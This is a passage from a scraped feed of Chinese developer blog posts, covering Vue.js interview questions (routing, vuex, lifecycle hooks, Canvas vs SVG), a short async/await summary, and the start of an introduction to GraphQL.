bash\" lang=\"bash\">&lt;div id=<span class=\"hljs-string\">\"app\"</span>&gt;  \n    &lt;!-- router-view 路由出口, 路由匹配到的组件将渲染在这里 --&gt;  \n    &lt;router-view&gt;&lt;/router-view&gt;  \n&lt;/div&gt;</code></pre><p>main.js，路由的重定向，就会在页面一加载的时候，就会将home组件显示出来，因为重定向指向了home组件，redirect的指向与path的必须一致。children里面是子路由，当然子路由里面还可以继续嵌套子路由。</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">import Vue from <span class=\"hljs-string\">'vue'</span>  \nimport VueRouter from <span class=\"hljs-string\">'vue-router'</span>  \nVue.use(VueRouter)  \n\n//引入两个组件 \n\nimport home from <span class=\"hljs-string\">\"./home.vue\"</span>  \nimport game from <span class=\"hljs-string\">\"./game.vue\"</span>  \n//定义路由  \nconst routes = [  \n    { path: <span class=\"hljs-string\">\"/\"</span>, redirect: <span class=\"hljs-string\">\"/home\"</span> },//重定向,指向了home组件  \n    {  \n        path: <span class=\"hljs-string\">\"/home\"</span>, component: home,  \n        children: [  \n            { path: <span class=\"hljs-string\">\"/home/game\"</span>, component: game }  \n        ]  \n    }  \n]  \n//创建路由实例  \nconst router = new VueRouter({routes})  \n\nnew Vue({  \n    el: <span class=\"hljs-string\">'#app'</span>,  \n    data: {  \n    },  \n    methods: {  \n    },  \n    router  \n})</code></pre><p>home.vue，点击显示就会将子路由显示在出来，子路由的出口必须在父路由里面，否则子路由无法显示。</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">&lt;template&gt;  \n    &lt;div&gt;  \n        &lt;h3&gt;首页&lt;/h3&gt;  \n        &lt;router-link to=<span class=\"hljs-string\">\"/home/game\"</span>&gt;  \n            &lt;button&gt;显示&lt;tton&gt;  \n        &lt;/router-link&gt;  \n        &lt;router-view&gt;&lt;/router-view&gt;  \n    &lt;/div&gt;  \n&lt;/template&gt;</code></pre><p> game.vue</p>\n<pre><code class=\"hljs bash\" lang=\"bash\"> &lt;template&gt;  \n    &lt;h3&gt;游戏&lt;/h3&gt;  \n&lt;/template&gt;</code></pre><h4 class=\"heading\" data-id=\"heading-7\">怎么定义vue-router的动态路由？怎么获取传过来的动态参数？</h4><blockquote>\n<p>在router目录下的index.js文件中，对path属性加上/:id。<br>使用router对象的params.id。</p>\n</blockquote>\n<h4 class=\"heading\" data-id=\"heading-8\">vue-router有哪几种导航钩子？</h4><p>三种，<br>第一种：是全局导航钩子：router.beforeEach(to,from,next)，作用：跳转前进行判断拦截。<br>第二种：组件内的钩子<br>第三种：单独路由独享组件</p>\n<h4 class=\"heading\" data-id=\"heading-9\">scss是什么？在vue.cli中的安装使用步骤是？有哪几大特性？</h4><p>css的预编译。</p>\n<blockquote>\n<p>使用步骤：</p>\n</blockquote>\n<p>第一步：用npm 下三个loader（sass-loader、css-loader、node-sass）</p>\n<p>第二步：在build目录找到webpack.base.config.js，在那个extends属性中加一个拓展.scss</p>\n<p>第三步：还是在同一个文件，配置一个module属性</p>\n<p>第四步：然后在组件的style标签加上lang属性 ，例如：lang=”scss”</p>\n<blockquote>\n<p>有哪几大特性:</p>\n</blockquote>\n<p>1、可以用变量，例如（$变量名称=值）；<br>2、可以用混合器，例如（）<br>3、可以嵌套</p>\n<h4 class=\"heading\" data-id=\"heading-10\">mint-ui是什么？怎么使用？说出至少三个组件使用方法？</h4><p>基于vue的前端组件库。npm安装，然后import样式和js，vue.use（mintUi）全局引入。在单个组件局部引入：import {Toast} from ‘mint-ui’。<br>组件一：Toast(‘登录成功’)；<br>组件二：mint-header；<br>组件三：mint-swiper</p>\n<h4 class=\"heading\" data-id=\"heading-11\">v-model是什么？怎么使用？ vue中标签怎么绑定事件？</h4><p>可以实现双向绑定，指令（v-class、v-for、v-if、v-show、v-on）。vue的model层的data属性。绑定事件：<code>&lt;input @click=doLog()/&gt;</code></p>\n<h4 class=\"heading\" data-id=\"heading-12\">iframe的优缺点？</h4><p>iframe也称作嵌入式框架，嵌入式框架和框架网页类似，它可以把一个网页的框架和内容嵌入在现有的网页中。</p>\n<blockquote>\n<p>优点：</p>\n</blockquote>\n<ol>\n<li>解决加载缓慢的第三方内容如图标和广告等的加载问题</li>\n<li>Security sandbox</li>\n<li>并行加载脚本</li>\n<li>方便制作导航栏</li>\n</ol>\n<blockquote>\n<p>缺点：</p>\n</blockquote>\n<ol>\n<li>iframe会阻塞主页面的Onload事件</li>\n<li>即时内容为空，加载也需要时间</li>\n<li>没有语意</li>\n</ol>\n<h4 class=\"heading\" data-id=\"heading-13\">简述一下Sass、Less，且说明区别？</h4><p>他们是动态的样式语言，是CSS预处理器,CSS上的一种抽象层。他们是一种特殊的语法/语言而编译成CSS。<br>变量符不一样，less是@，而Sass是$;<br>Sass支持条件语句，可以使用if{}else{},for{}循环等等。而Less不支持;<br>Sass是基于Ruby的，是在服务端处理的，而Less是需要引入less.js来处理Less代码输出Css到浏览器</p>\n<h4 class=\"heading\" data-id=\"heading-14\">axios是什么？怎么使用？描述使用它实现登录功能的流程？</h4><p>请求后台资源的模块。npm install axios -S装好，然后发送的是跨域，需在配置文件中config/index.js进行设置。后台如果是Tp5则定义一个资源路由。js中使用import进来，然后.get或.post。返回在.then函数中如果成功，失败则是在.catch函数中</p>\n<h4 class=\"heading\" data-id=\"heading-15\">axios+tp5进阶中，调用axios.post(‘api/user’)是进行的什么操作？axios.put(‘api/user/8′)呢？</h4><p>跨域，添加用户操作，更新操作。</p>\n<h4 class=\"heading\" data-id=\"heading-16\">vuex是什么？怎么使用？哪种功能场景使用它？</h4><p>vue框架中状态管理。在main.js引入store，注入。新建了一个目录store，….. export 。场景有：单页应用中，组件之间的状态。音乐播放、登录状态、加入购物车</p>\n<h4 class=\"heading\" data-id=\"heading-17\">mvvm框架是什么？它和其它框架（jquery）的区别是什么？哪些场景适合？</h4><p>一个model+view+viewModel框架，数据模型model，viewModel连接两个</p>\n<p>区别：vue数据驱动，通过数据来显示视图层而不是节点操作。</p>\n<p>场景：数据操作比较多的场景，更加便捷</p>\n<h4 class=\"heading\" data-id=\"heading-18\">自定义指令（v-check、v-focus）的方法有哪些？它有哪些钩子函数？还有哪些钩子函数参数？</h4><p>全局定义指令：在vue对象的directive方法里面有两个参数，一个是指令名称，另外一个是函数。组件内定义指令：directives</p>\n<p>钩子函数：bind（绑定事件触发）、inserted(节点插入的时候触发)、update（组件内相关更新）</p>\n<p>钩子函数参数：el、binding</p>\n<h4 class=\"heading\" data-id=\"heading-19\">说出至少4种vue当中的指令和它的用法？</h4><p>v-if：判断是否隐藏；v-for：数据循环出来；v-bind:class：绑定一个属性；v-model：实现双向绑定</p>\n<h4 class=\"heading\" data-id=\"heading-20\">vue-router是什么？它有哪些组件？</h4><p>vue用来写路由一个插件。router-link、router-view</p>\n<h4 class=\"heading\" data-id=\"heading-21\">导航钩子有哪些？它们有哪些参数？</h4><blockquote>\n<p>导航钩子有：</p>\n</blockquote>\n<p>a/全局钩子和组件内独享的钩子。b/beforeRouteEnter、afterEnter、beforeRouterUpdate、beforeRouteLeave</p>\n<blockquote>\n<p>参数：</p>\n</blockquote>\n<p>有to（去的那个路由）、from（离开的路由）、next（一定要用这个函数才能去到下一个路由，如果不用就拦截）最常用就这几种</p>\n<h4 class=\"heading\" data-id=\"heading-22\">Vue的双向数据绑定原理是什么？</h4><p>vue.js 是采用数据劫持结合发布者-订阅者模式的方式，通过Object.defineProperty()来劫持各个属性的setter，getter，在数据变动时发布消息给订阅者，触发相应的监听回调。</p>\n<blockquote>\n<p>具体步骤：</p>\n</blockquote>\n<p><strong>第一步：</strong>需要observe的数据对象进行递归遍历，包括子属性对象的属性，都加上 setter和getter<br>这样的话，给这个对象的某个值赋值，就会触发setter，那么就能监听到了数据变化</p>\n<p><strong>第二步：</strong>compile解析模板指令，将模板中的变量替换成数据，然后初始化渲染页面视图，并将每个指令对应的节点绑定更新函数，添加监听数据的订阅者，一旦数据有变动，收到通知，更新视图</p>\n<p><strong>第三步：</strong>Watcher订阅者是Observer和Compile之间通信的桥梁，主要做的事情是:<br>1、在自身实例化时往属性订阅器(dep)里面添加自己<br>2、自身必须有一个update()方法<br>3、待属性变动dep.notice()通知时，能调用自身的update()方法，并触发Compile中绑定的回调，则功成身退。</p>\n<p><strong>第四步：</strong>MVVM作为数据绑定的入口，整合Observer、Compile和Watcher三者，通过Observer来监听自己的model数据变化，通过Compile来解析编译模板指令，最终利用Watcher搭起Observer和Compile之间的通信桥梁，达到数据变化 -&gt; 视图更新；视图交互变化(input) -&gt; 数据model变更的双向绑定效果。</p>\n<h4 class=\"heading\" data-id=\"heading-23\">请详细说下你对vue生命周期的理解？</h4><p>总共分为8个阶段创建前/后，载入前/后，更新前/后，销毁前/后</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">创建前/后： 在beforeCreated阶段，vue实例的挂载元素<span class=\"hljs-variable\">$el</span>和数据对象data都为undefined，还未初始化。在created阶段，vue实例的数据对象data有了，<span class=\"hljs-variable\">$el</span>还没有。\n\n载入前/后：在beforeMount阶段，vue实例的<span class=\"hljs-variable\">$el</span>和data都初始化了，但还是挂载之前为虚拟的dom节点，data.message还未替换。在mounted阶段，vue实例挂载完成，data.message成功渲染。\n\n更新前/后：当data变化时，会触发beforeUpdate和updated方法。\n\n销毁前/后：在执行destroy方法后，对data的改变不会再触发周期函数，说明此时vue实例已经解除了事件监听以及和dom的绑定，但是dom结构依然存在</code></pre><h4 class=\"heading\" data-id=\"heading-24\">请说下封装 vue 组件的过程？</h4><p>首先，组件可以提升整个项目的开发效率。能够把页面抽象成多个相对独立的模块，解决了我们传统项目开发：效率低、难维护、复用性等问题。</p>\n<p>然后，使用Vue.extend方法创建一个组件，然后使用Vue.component方法注册组件。子组件需要数据，可以在props中接受定义。而子组件修改好数据后，想把数据传递给父组件。可以采用emit方法。</p>\n<h4 class=\"heading\" data-id=\"heading-25\">你是怎么认识vuex的？</h4><p>vuex可以理解为一种开发模式或框架。比如PHP有thinkphp，java有spring等。<br>通过状态（数据源）集中管理驱动组件的变化（好比spring的IOC容器对bean进行集中管理）。</p>\n<p>应用级的状态集中放在store中； 改变状态的方式是提交mutations，这是个同步的事物； 异步逻辑应该封装在action中。</p>\n<h4 class=\"heading\" data-id=\"heading-26\">vue-loader是什么？使用它的用途有哪些？</h4><p>解析.vue文件的一个加载器，跟template/js/style转换成js模块。</p>\n<p>用途：js可以写es6、style样式可以scss或less、template可以加jade等</p>\n<h4 class=\"heading\" data-id=\"heading-27\">请说出vue.cli项目中src目录每个文件夹和文件的用法？</h4><p>assets文件夹是放静态资源；components是放组件；router是定义路由相关的配置;view视图；app.vue是一个应用主组件；main.js是入口文件</p>\n<h4 class=\"heading\" data-id=\"heading-28\">vue.cli中怎样使用自定义的组件？有遇到过哪些问题吗？</h4><p>第一步：在components目录新建你的组件文件（smithButton.vue），script一定要export default {</p>\n<p>第二步：在需要用的页面（组件）中导入：import smithButton from ‘../components/smithButton.vue’</p>\n<p>第三步：注入到vue的子组件的components属性上面,components:{smithButton}</p>\n<p>第四步：在template视图view中使用，<code>&lt;smith-button&gt;  &lt;/smith-button&gt;</code><br>问题有：smithButton命名，使用的时候则smith-button。</p>\n<h4 class=\"heading\" data-id=\"heading-29\">聊聊你对Vue.js的template编译的理解？</h4><p>简而言之，就是先转化成AST树，再得到的render函数返回VNode（Vue的虚拟DOM节点）</p>\n<blockquote>\n<p>详情步骤：</p>\n</blockquote>\n<p>首先，通过compile编译器把template编译成AST语法树（abstract syntax tree 即 源代码的抽象语法结构的树状表现形式），compile是createCompiler的返回值，createCompiler是用以创建编译器的。另外compile还负责合并option。</p>\n<p>然后，AST会经过generate（将AST语法树转化成render funtion字符串的过程）得到render函数，render的返回值是VNode，VNode是Vue的虚拟DOM节点，里面有（标签名、子节点、文本等等）</p>\n<h4 class=\"heading\" data-id=\"heading-30\">vue的历史记录</h4><p>history 记录中向前或者后退多少步</p>\n<h4 class=\"heading\" data-id=\"heading-31\">vuejs与angularjs以及react的区别？</h4><h5 class=\"heading\" data-id=\"heading-32\">1.与AngularJS的区别</h5><blockquote>\n<p>相同点：</p>\n</blockquote>\n<p>都支持指令：内置指令和自定义指令。</p>\n<p>都支持过滤器：内置过滤器和自定义过滤器。</p>\n<p>都支持双向数据绑定。</p>\n<p>都不支持低端浏览器。</p>\n<blockquote>\n<p>不同点：</p>\n</blockquote>\n<p>1.AngularJS的学习成本高，比如增加了Dependency Injection特性，而Vue.js本身提供的API都比较简单、直观。</p>\n<p>2.在性能上，AngularJS依赖对数据做脏检查，所以Watcher越多越慢。</p>\n<p>Vue.js使用基于依赖追踪的观察并且使用异步队列更新。所有的数据都是独立触发的。</p>\n<p>对于庞大的应用来说，这个优化差异还是比较明显的。</p>\n<h5 class=\"heading\" data-id=\"heading-33\">2.与React的区别</h5><blockquote>\n<p>相同点：</p>\n</blockquote>\n<p>React采用特殊的JSX语法，Vue.js在组件开发中也推崇编写.vue特殊文件格式，对文件内容都有一些约定，两者都需要编译后使用。</p>\n<p>中心思想相同：一切都是组件，组件实例之间可以嵌套。</p>\n<p>都提供合理的钩子函数，可以让开发者定制化地去处理需求。</p>\n<p>都不内置列数AJAX，Route等功能到核心包，而是以插件的方式加载。</p>\n<p>在组件开发中都支持mixins的特性。</p>\n<blockquote>\n<p>不同点：</p>\n</blockquote>\n<p>React依赖Virtual DOM,而Vue.js使用的是DOM模板。React采用的Virtual DOM会对渲染出来的结果做脏检查。</p>\n<p>Vue.js在模板中提供了指令，过滤器等，可以非常方便，快捷地操作DOM。</p>\n<h1 class=\"heading\" data-id=\"heading-34\">vue生命周期面试题</h1><h4 class=\"heading\" data-id=\"heading-35\">什么是vue生命周期？</h4><p> Vue 实例从创建到销毁的过程，就是生命周期。也就是从开始创建、初始化数据、编译模板、挂载Dom→渲染、更新→渲染、卸载等一系列过程，我们称这是 Vue 的生命周期。</p>\n<h4 class=\"heading\" data-id=\"heading-36\">vue生命周期的作用是什么？</h4><p>它的生命周期中有多个事件钩子，让我们在控制整个Vue实例的过程时更容易形成好的逻辑。</p>\n<h4 class=\"heading\" data-id=\"heading-37\">vue生命周期总共有几个阶段？</h4><p>它可以总共分为8个阶段：创建前/后, 载入前/后,更新前/后,销毁前/销毁后</p>\n<h4 class=\"heading\" data-id=\"heading-38\">第一次页面加载会触发哪几个钩子？</h4><p>第一次页面加载时会触发 beforeCreate, created, beforeMount, mounted 这几个钩子</p>\n<h4 class=\"heading\" data-id=\"heading-39\">DOM 渲染在 哪个周期中就已经完成？</h4><p>DOM 渲染在 mounted 中就已经完成了</p>\n<h4 class=\"heading\" data-id=\"heading-40\">简单描述每个周期具体适合哪些场景？</h4><p>生命周期钩子的一些使用方法： beforecreate : 可以在这加个loading事件，在加载实例时触发 created : 初始化完成时的事件写在这里，如在这结束loading事件，异步请求也适宜在这里调用 mounted : 挂载元素，获取到DOM节点 updated : 如果对数据统一处理，在这里写上相应函数 beforeDestroy : 可以做一个确认停止事件的确认框 nextTick : 更新数据后立即操作dom</p>\n<p>arguments是一个伪数组，没有遍历接口，不能遍历</p>\n<h4 class=\"heading\" data-id=\"heading-41\">cancas和SVG的是什么以及区别</h4><blockquote>\n<p>SVG</p>\n</blockquote>\n<p>SVG 是一种使用 XML 描述 2D 图形的语言。<br>SVG 基于 XML，这意味着 SVG DOM 中的每个元素都是可用的。您可以为某个元素附加 JavaScript 事件处理器。<br>在 SVG 中，每个被绘制的图形均被视为对象。如果 SVG 对象的属性发生变化，那么浏览器能够自动重现图形。</p>\n<blockquote>\n<p>Canvas</p>\n</blockquote>\n<p>Canvas 通过 JavaScript 来绘制 2D 图形。<br>Canvas 是逐像素进行渲染的。<br>在 canvas 中，一旦图形被绘制完成，它就不会继续得到浏览器的关注。如果其位置发生变化，那么整个场景也需要重新绘制，包括任何或许已被图形覆盖的对象。</p>\n<p><strong>Canvas 与 SVG 的比较</strong></p>\n<blockquote>\n<p>Canvas</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">依赖分辨率\n不支持事件处理器\n弱的文本渲染能力\n能够以 .png 或 .jpg 格式保存结果图像\n最适合图像密集型的游戏，其中的许多对象会被频繁重绘</code></pre><p>SVG</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">不依赖分辨率\n支持事件处理器\n最适合带有大型渲染区域的应用程序（比如谷歌地图）\n复杂度高会减慢渲染速度（任何过度使用 DOM 的应用都不快）\n不适合游戏应用</code></pre></blockquote>\n</div>"},{"title":"1 分钟读完《10 分钟学会 JavaScript 的 Async/Await》","avatar":"https://user-gold-cdn.xitu.io/2016/11/29/9353b74f1dd7cab2edb0d04a6d87d3b5?imageView2/1/w/100/h/100/q/85/format/webp/interlace/1","author":"justjavac","create_time":"2017 年 11 月 01 日","tags":["Promise","JavaScript"],"content":"<div data-v-13f76525=\"\" data-v-3f216172=\"\" class=\"entry-content post-content juejin-image-viewer__container\"><p>1 分钟读完 <a href=\"https://link.juejin.im?target=https%3A%2F%2Ftutorialzine.com%2F2017%2F07%2Fjavascript-async-await-explained\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">JavaScript Async/Await Explained in 10 Minutes</a></p>\n<p></p><figure><img alt=\"10 分钟学会 JavaScript 的 Async/Await\" class=\"lazyload inited loaded\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/1/cf4a8ceaac0f41bff9b751e327e312d7?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"800\" data-height=\"600\" src=\"https://user-gold-cdn.xitu.io/2017/11/1/cf4a8ceaac0f41bff9b751e327e312d7?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\"><figcaption>10 分钟学会 JavaScript 的 Async/Await</figcaption></figure><p></p>\n<p>以前我们使用 callback。</p>\n<p>后来我们使用 Promise。</p>\n<p>现在我们使用 Async/Await。</p>\n<h2 data-id=\"heading-0\">1、什么是 Async/Await？</h2>\n<p>Async - 定义异步函数(<code>async function someName(){...}</code>)</p>\n<ul>\n<li>自动把函数转换为 Promise</li>\n<li>当调用异步函数时，函数返回值会被 resolve 处理</li>\n<li>异步函数内部可以使用 <code>await</code></li>\n</ul>\n<p>Await - 暂停异步函数的执行 (<code>var result = await someAsyncCall();</code>)</p>\n<ul>\n<li>当使用在 Promise 前面时，<code>await</code> 等待 Promise 完成，并返回 Promise 的结果</li>\n<li><code>await</code> <strong>只能</strong>和 Promise 一起使用，<strong>不能</strong>和 callback 一起使用</li>\n<li><code>await</code> 只能用在 <code>async</code> 函数中</li>\n</ul>\n<h2 data-id=\"heading-1\">2、Async/Await 是否会取代 Promise</h2>\n<p>不会。</p>\n<ul>\n<li>Async/Await 底层依然使用了 Promise。</li>\n<li>多个异步函数同时执行时，需要借助 <code>Promise.all</code></li>\n</ul>\n<pre><code class=\"hljs javascript\"><span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">getABC</span>(<span class=\"hljs-params\"></span>) </span>{\n  <span class=\"hljs-keyword\">let</span> A = <span class=\"hljs-keyword\">await</span> getValueA(); <span class=\"hljs-comment\">// getValueA 花费 2 秒</span>\n  <span class=\"hljs-keyword\">let</span> B = <span class=\"hljs-keyword\">await</span> getValueB(); <span class=\"hljs-comment\">// getValueA 花费 4 秒</span>\n  <span class=\"hljs-keyword\">let</span> C = <span class=\"hljs-keyword\">await</span> getValueC(); <span class=\"hljs-comment\">// getValueA 花费 3 秒</span>\n\n  <span class=\"hljs-keyword\">return</span> A*B*C;\n}</code></pre><p>每次遇到 <code>await</code> 关键字时，Promise 都会停下在，一直到运行结束，所以总共花费是 2+4+3 = 9 秒。<strong><code>await</code> 把异步变成了同步</strong>。</p>\n<pre><code class=\"hljs javascript\"><span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">getABC</span>(<span class=\"hljs-params\"></span>) </span>{\n  <span class=\"hljs-comment\">// Promise.all() 允许同时执行所有的异步函数</span>\n  <span class=\"hljs-keyword\">let</span> results = <span class=\"hljs-keyword\">await</span> <span class=\"hljs-built_in\">Promise</span>.all([ getValueA, getValueB, getValueC ]); \n\n  <span class=\"hljs-keyword\">return</span> results.reduce(<span class=\"hljs-function\">(<span class=\"hljs-params\">total,value</span>) =&gt;</span> total * value);\n}</code></pre><p>函数总耗时为 4 秒（<code>getValueB</code> 的耗时）。</p>\n<h2 data-id=\"heading-2\">3、Async/Await 的错误处理</h2>\n<p>在 Async/Await 语法中，我们可以使用 try/catch 进行错误处理。在 Promise 中的 <code>.catch()</code> 分支会进入 <code>catch</code> 语句。 </p>\n<hr>\n<blockquote>\n<p>阅读原文：<a href=\"https://link.juejin.im?target=https%3A%2F%2Ftutorialzine.com%2F2017%2F07%2Fjavascript-async-await-explained\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">JavaScript Async/Await Explained in 10 Minutes</a></p>\n<p>讨论地址：<a href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fdev-reading%2Ffe%2Fissues%2F3\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">10 分钟学会 JavaScript 的 Async/Await</a></p>\n<p>如果你想参与讨论，请<a href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fdev-reading%2Ffe\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">点击这里</a></p>\n</blockquote>\n</div>"},{"title":"GraphQL 初探—面向未来 API 及其生态圈","avatar":"https://dn-mhke0kuv.qbox.me/8132eeef2c3edd765d6a.jpg?imageView2/1/w/100/h/100/q/85/format/webp/interlace/1","author":"美团点评点餐","create_time":"2017 年 11 月 03 日","tags":["Node.js","Facebook","API","前端","后端","GraphQL"],"content":"<div data-v-13f76525=\"\" data-v-3f216172=\"\" class=\"entry-content post-content juejin-image-viewer__container\"><div></div><p>什么是<a href=\"https://link.juejin.im?target=http%3A%2F%2Fgraphql.org%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"> GraphQL </a>？第一次看到这个名词未免让人联想到数据库查询语言 SQL 。但本质上，这是两个完全不同的东西， GraphQL 在官方文档里的定义如下：</p><blockquote><p>GraphQL is a query language for your API, and a server-side runtime for executing queries by using a type system you define for your data.</p></blockquote><p>即 GraphQL 既是一个 API 查询语言，也指其服务端实现。但 GraphQL 不只是为了在 API 领域搞个类似数据库的查询语言，它的诞生更涉及到 API 设计的思路转变。</p><h2 data-id=\"heading-0\">REST 模式的难题</h2><p>通常，一项新技术的产生都会伴随着两个背景，一个是该技术所在的领域出现了新趋势、二是原有的技术难以应对新趋势。而近几年， API 领域有几个趋势愈发值得关注：</p><p>首先是日益增多的移动端应用，和移动端性能本身较低下的矛盾，要求数据加载过程更高效。</p><p>再者，要满足客户端和前端快速开发、快速添加特性的需求， API 必须能快速拓展。</p><p>第三则是各种不同的前端框架和平台层出不穷，而后端 API 服务面对众多的前端框架、乃至前端和客户端共享 API 的情况，其能否按需提供数据，会影响接口复用度和开发效率。</p><p>而现如今在 API 领域被广泛使用的<a href=\"https://link.juejin.im?target=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FRepresentational_state_transfer\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"> REST 模式</a>，面对上述愈发复杂的客户端和服务端交互，问题也渐渐浮现：</p><p>首先是接口灵活性差。由于设计接口粒度较粗或历史遗留原因，接口中有时会存在当前数据交互不需要的字段，导致取到无用且多余的数据；而另一方面，有时前端需要一份数据，却需要手动访问多个接口才能完整获取。</p><p>第二是接口操作流程繁琐，回想下前端获取数据的过程，通常我们要先构造 HTTP 请求，然后接收和解析服务端响应。有时还要对收到的或处理后的数据另作本地数据转储，最后才进行 UI 展示。</p><p>第三，随着客户端功能拓展，服务端不断增加接口。这样维护众多接口，不仅服务端维护成本高，此外也不能按需提供数据、阻碍了客户端的快速迭代和拓展。</p><p>还有 REST 模式实质上是基于 HTTP 协议的，这虽让其易于被 Web 开发人员理解和上手，但也决定它不能灵活选择网络协议来解决问题。</p><h2 data-id=\"heading-1\">GraphQL 的解决方案</h2><p>面对 REST 模式的上述不足， Facebook 提出了他们的解决方案 – GraphQL ：</p><p><img alt=\"\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/3/cbadb185098b113147683daa45664122?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"800\" data-height=\"600\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;600&quot;&gt;&lt;/svg&gt;\"></p><p>前面提到 GraphQL 既是一个 API 查询语言，也指其服务端实现，所以 GraphQL 本身也由两部分组成，Facebook 将它们分别<a href=\"https://link.juejin.im?target=https%3A%2F%2Fmedium.com%2F%40leeb%2Frelicensing-the-graphql-specification-e7d07a52301b\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">开源</a>：</p><ul><li>语言标准： <a href=\"https://link.juejin.im?target=http%3A%2F%2Fwww.openwebfoundation.org%2Flegal%2Fthe-owf-1-0-agreements%2Fowfa-1-0\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Open Web Foundation Agreement (OWFa) v1.0 协议</a></li><li>GraphQL.js、客户端工具Relay： MIT 协议</li></ul><p>我们来逐条了解下 GraphQL 的特性：</p><h3 data-id=\"heading-2\">声明式的数据获取</h3><p>如下图所示，声明式的数据查询带来了接口的精确返回，服务器会按数据查询的格式返回同样结构的 JSON 数据、真正照顾了客户端的灵活性：</p><p><img alt=\"\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/3/26a7b768142ecdd3dacec2ae61ec0bbb?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"800\" data-height=\"600\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;600&quot;&gt;&lt;/svg&gt;\"></p><p>另外，这种数据获取方式也带来更简洁的数据查询流程。 GraphQL 认为，客户端只需描述查询结构发起查询，再把服务端响应数据用于 UI 展示即可。中间构造请求和转储数据的操作可以交由 GraphQL 客户端辅助完成。</p><h3 data-id=\"heading-3\">一个服务仅暴露一个 GraphQL 层</h3><p><img alt=\"\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/3/6cfce8faa6341c68636feb61dfd6fbfe?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"800\" data-height=\"600\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;600&quot;&gt;&lt;/svg&gt;\"></p><p>上图是一个 GraphQL 应用的基本架构，其中客户端只和 GraphQL 层进行 API 交互，而 GraphQL 层再往后接入各种数据源。这样一来，只要是数据源有的数据， GraphQL 层都可以让客户端按需获取，不必专门再去定接口了。</p><h3 data-id=\"heading-4\">传输层无关、数据库技术无关</h3><p>带来了更灵活的技术栈选择，比如我们可以选择对移动设备友好的协议，将网络传输数据量最小化，实现在网络协议层面优化应用。</p><h2 data-id=\"heading-5\">GraphQL 接入概览</h2><p>既然 GraphQL 有诸多优点，那又该如何接入呢？大体上，有三种接入的方式：</p><h3 data-id=\"heading-6\">直连数据库的GraphQL服务</h3><p><img alt=\"\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/3/8b4ca9db43f8f223fe0f1f304e051db8?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"800\" data-height=\"600\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;600&quot;&gt;&lt;/svg&gt;\"></p><p>最为简洁的服务配置，直接操作数据库也能减少中间环节的性能损耗。</p><h3 data-id=\"heading-7\">集成现有服务的GraphQL层</h3><p><img alt=\"\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/3/3269c3eef1257d5196b747e2dfe7c01e?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"800\" data-height=\"600\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;600&quot;&gt;&lt;/svg&gt;\"></p><p>这种配置适合于旧服务的改造，尤其是在涉及第三方服务时、依然可以通过原有接口进行交互。</p><h3 data-id=\"heading-8\">直连数据库和集成服务的混合模式</h3><p>前两种方式的混合：</p><p><img alt=\"\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/3/2d3ebcaf728d83d65b3fb1ec4fe91879?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"800\" data-height=\"600\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;600&quot;&gt;&lt;/svg&gt;\"></p><h2 data-id=\"heading-9\">GraphQL 核心概念浅析</h2><p>GraphQL 的一大特点便是声明式的 API Schema ，GraphQL 的 Schema 是一个声明式的查询规范（可认为是服务器和客户端间的一个查询协议），它主要由两部分组成：</p><ul><li>类型系统</li><li>编写语法：SDL（视图定义语言）</li></ul><p>GraphQL 的类型系统包含了各编程语言中通用的一些数据类型，具体可参考<a 